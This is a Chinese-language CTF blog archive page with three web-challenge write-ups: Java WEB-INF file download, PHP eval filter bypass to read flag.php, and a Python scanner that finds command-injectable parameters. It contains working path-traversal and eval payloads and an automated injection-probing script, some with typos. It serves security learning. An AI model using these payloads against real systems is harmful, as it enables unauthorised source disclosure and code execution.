<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/7/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 5.4.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 11.25px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.25px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-java的WEB-INF" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/30/java%E7%9A%84WEB-INF/" class="article-date">
  	<time datetime="2021-08-29T16:00:00.000Z" itemprop="datePublished">2021-08-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/30/java%E7%9A%84WEB-INF/">
        java的WEB-INF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="java的WEB-INF文件"><a href="#java的WEB-INF文件" class="headerlink" title="java的WEB-INF文件"></a>java的WEB-INF文件</h1><p>我们点击help，出现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>
<p>而且payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/Download?filename=文件名</span><br></pre></td></tr></table></figure>
<p>可见可能是文件包含，可以用此下载文件，不过用get提交的方式不可以，所以此处我们可以试一下post提交，发现可以下载help.docx文件，而且用bp抓包，放到repeater后改为post提交，可以看见500状态码，即服务器内部出错，并爆出一些关键信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 – Internal Server Error&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;h1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; h2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; h3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; body &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; b &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; p &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125; a &#123;color:black;&#125; a.name &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 – Internal Server Error&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.NullPointerException</span><br><span class="line">	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:130)</span><br><span class="line">	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:93)</span><br><span class="line">	com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:661)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:742)</span><br><span class="line">	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br><span class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;h3&gt;Apache Tomcat/8.5.24&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>其中我们可以看见</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</span><br></pre></td></tr></table></figure>
<p>而一般我们出于安全的考虑，我们会将网页放在WEB-INF文件下，防止页面被直接访问，而要访问WEB-INF文件下的网页，在WEB-INF文件下设置web.xml文件，其中web.xml的格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--直接设置 welcome-file 节点--&gt;</span><br><span class="line">&lt;welcome-file&gt; ./WEB-INF/views/xxx.jsp&lt;/weclome-file&gt;</span><br></pre></td></tr></table></figure>
<p>访问地址为：<a target="_blank" rel="noopener" href="http://url/xxx/%EF%BC%88xxx%E4%B8%BA%E9%A1%B9%E7%9B%AE%E5%90%8D%EF%BC%89">http://url/xxx/（xxx为项目名）</a></p>
<p>因此，我们可以包含web.xml文件，即将help.docx改为web.xml进行post提交即可下载web.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt;</span><br><span class="line">&lt;welcome-file-list&gt;</span><br><span class="line">&lt;welcome-file&gt;Index&lt;/welcome-file&gt;</span><br><span class="line">&lt;/welcome-file-list&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
<p>通过看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br></pre></td></tr></table></figure>
<p>可知FlagController.class文件放在WEB-INF/classes/com/wm/ctf/中</p>
<p>WEB-INF主要包含的文件和目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<p>所以可以和上面一样，包含FlagController.class文件，因此构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
<p>即可得到，里面的base64的码就是flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-搜索读取文件的php函数的应用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/30/%E6%90%9C%E7%B4%A2%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84php%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/" class="article-date">
  	<time datetime="2021-08-29T16:00:00.000Z" itemprop="datePublished">2021-08-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/30/%E6%90%9C%E7%B4%A2%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84php%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/">
        搜索读取文件的php函数的应用
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="搜索读取文件的php函数的应用"><a href="#搜索读取文件的php函数的应用" class="headerlink" title="搜索读取文件的php函数的应用"></a>搜索读取文件的php函数的应用</h1><p>打开页面，尝试各种泄露的可能，用GitHack.py发现是.git文件泄露，因此构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://url/.git/</span><br></pre></td></tr></table></figure>
<p>获取源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过看到eval()这个危险函数，我们可以构造一些恶意代码来读取，但是它过滤掉了一些伪协议和一些函数，但是我们可以先构造一个exp，在本地尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">print_r(scandir(&quot;.&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>来读取当前目录下的文件，如果“.”改为“\”,会读取系统下目录的文件，我们也可以使用localeconv()函数返回一包含本地数字及货币格式信息的数组，而构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(localeconv()));</span><br></pre></td></tr></table></figure>
<p>可以看到第一个数组为“.”，因此，我们可以使用current()函数或pos()函数来默认读取返回数组中的当前单元，默认取第一个值。构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localconv())));</span><br></pre></td></tr></table></figure>
<p>发现里面有flag.php，此时我们可以使用array_reverse()函数来颠倒数组中元素的顺序，而后用next()读取数组中的第二个元素，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(next(array_reverse(scandir(localconv()))));</span><br></pre></td></tr></table></figure>
<p>而后我们可以用readfile()函数或hightlight_file()函数或show_source()函数来读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(localeconv()))));</span><br></pre></td></tr></table></figure>
<p>当然也可以用array_file()来调换键和值的位置，然后用array_rand()读取键值，不断刷新不断随机返回</p>
<p>同时我们也可以使用PHPSESSID来解题，因为flag.php文件里的字符是由PHPSESSID来支持的，但是在使用session前要通过session_start()来告诉php我要使用session，因为php默认不主动使用session，而session_id()可以获取当前的session id</p>
<p>使用方法，我们要手动设置名为PHPSESSID的cookie，并设置值为flag.php，而后构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(session_id(session_start());</span><br></pre></td></tr></table></figure>
<p>可返回flag.php</p>
<p>而后和上面一样，用readfile()函数或hightlight_file()函数或show_source()函数来读取文件，要手动设置名为PHPSESSID的cookie，并设置值为flag.php，而后构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start());</span><br></pre></td></tr></table></figure>
<p>读取flag.php的内容</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-多个php文件寻找参数可利用点" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/30/%E5%A4%9A%E4%B8%AAphp%E6%96%87%E4%BB%B6%E5%AF%BB%E6%89%BE%E5%8F%82%E6%95%B0%E5%8F%AF%E5%88%A9%E7%94%A8%E7%82%B9/" class="article-date">
  	<time datetime="2021-08-29T16:00:00.000Z" itemprop="datePublished">2021-08-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/30/%E5%A4%9A%E4%B8%AAphp%E6%96%87%E4%BB%B6%E5%AF%BB%E6%89%BE%E5%8F%82%E6%95%B0%E5%8F%AF%E5%88%A9%E7%94%A8%E7%82%B9/">
        多个php文件寻找参数可利用点
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="多个php文件寻找参数可利用点"><a href="#多个php文件寻找参数可利用点" class="headerlink" title="多个php文件寻找参数可利用点"></a>多个php文件寻找参数可利用点</h1><p>打开页面，可以看见<a target="_blank" rel="noopener" href="http://www.tar.gz,可知是文件泄露,因此通过构造payload获取源码/">www.tar.gz，可知是文件泄露，因此通过构造payload获取源码</a></p>
<p>发现源码有上千个文件，且文件中有许多的get和post参数的提交，因此，我们可以通过一个思路来写一个exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先我们要得到各个文件的get和post参数有哪些</span><br><span class="line"></span><br><span class="line">其次我们要利用参数构造payload来传参</span><br><span class="line">get提交payload：http://url/文件名?参数名=echo ~hahaha~;</span><br><span class="line"></span><br><span class="line">最后看返回的信息中是否~hahaha~，如果有，则证明此参数可利用，而后构造cat%20/flag即可读取信息</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"># _*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">requests.adapters.DEFAULT_RETRIES=8</span><br><span class="line">session=requests.Session()</span><br><span class="line">session.keep_alive=False</span><br><span class="line"></span><br><span class="line">sem=threading.Semaphore(30) #设置线程数</span><br><span class="line">url=&quot;http://647c1229-fdeb-4406-9775-cf4e0c33c9d4.node4.buuoj.cn:81/&quot;</span><br><span class="line">path=r&quot;D:\比赛临时文档\buu\src\\&quot;</span><br><span class="line"></span><br><span class="line">rrGET = re.compile(r&quot;\$_GET\[\&#x27;(\w+)\&#x27;\]&quot;) #获取get参数</span><br><span class="line">rrPOST = re.compile(r&quot;\$_POST\[\&#x27;(\w+)\&#x27;\]&quot;) #获取post参数 </span><br><span class="line"></span><br><span class="line">fileNames=os.listdir(path)</span><br><span class="line">local_file=open(&quot;flag.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">def run(fileName):</span><br><span class="line">    with sem:</span><br><span class="line">        file=open(path+fileName,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;)</span><br><span class="line">        content=file.read()</span><br><span class="line">        print(&quot;[+]checking:%s&quot;%fileName)</span><br><span class="line">        # get提交</span><br><span class="line">        for i in rrGET.findall(content):</span><br><span class="line">            r = session.get( url + &quot;%s?%s=%s&quot; % (fileName,i,&quot;echo ~h3zh1~;&quot;) )</span><br><span class="line">            if &quot;~h3zh1~&quot; in r.text:</span><br><span class="line">                flag=&quot;You Find it in GET fileName=%s and param=%s\n&quot;%(fileName,i)</span><br><span class="line">                print(flag)</span><br><span class="line">                local_file.write(flag)</span><br><span class="line">        #post提交</span><br><span class="line">        # for i in rrPOST.findall(content):</span><br><span class="line">            # r=session.post(url+fileName,data=&#123;i:&quot;echo ~h3zh1~;&quot;&#125;)</span><br><span class="line">            # if &quot;~h3zh1~&quot; in r.text:</span><br><span class="line">                # flag= &quot;You Find it in GET fileName = %s and param = %s \n&quot; % ( fileName, i )</span><br><span class="line">                # print(flag)</span><br><span class="line">                # local_file.write(flag)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    start_time=time.time()</span><br><span class="line">    print(&quot;[start]程序开始:&quot;+str(start_time))</span><br><span class="line">    thread_list=[]</span><br><span class="line">    for fileName in fileNames:</span><br><span class="line">        t=threading.Thread(target=run,args=(fileName,))</span><br><span class="line">        thread_list.append(t)</span><br><span class="line">    for t in thread_list:</span><br><span class="line">        t.start()</span><br><span class="line">    for t in thread_list:</span><br><span class="line">        t.join()</span><br><span class="line">    end_time=time.time()</span><br><span class="line">    local_file.close()</span><br><span class="line">    print(&quot;[end]程序结束:用时(秒):&quot;+str(end_time-start_time))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以搭建环境，url设置为<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/src/%EF%BC%88%E7%9C%8B%E8%87%AA%E5%B7%B1%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%89,%E4%BD%86%E6%98%AFphp%E7%89%88%E6%9C%AC%E8%A6%81%E5%9C%A87%E4%BB%A5%E4%B8%8A%EF%BC%8C%E5%90%A6%E5%88%99%E4%BC%9A%E6%8A%A5%E9%94%99">http://127.0.0.1/sqli/src/（看自己文件的位置）,但是php版本要在7以上，否则会报错</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
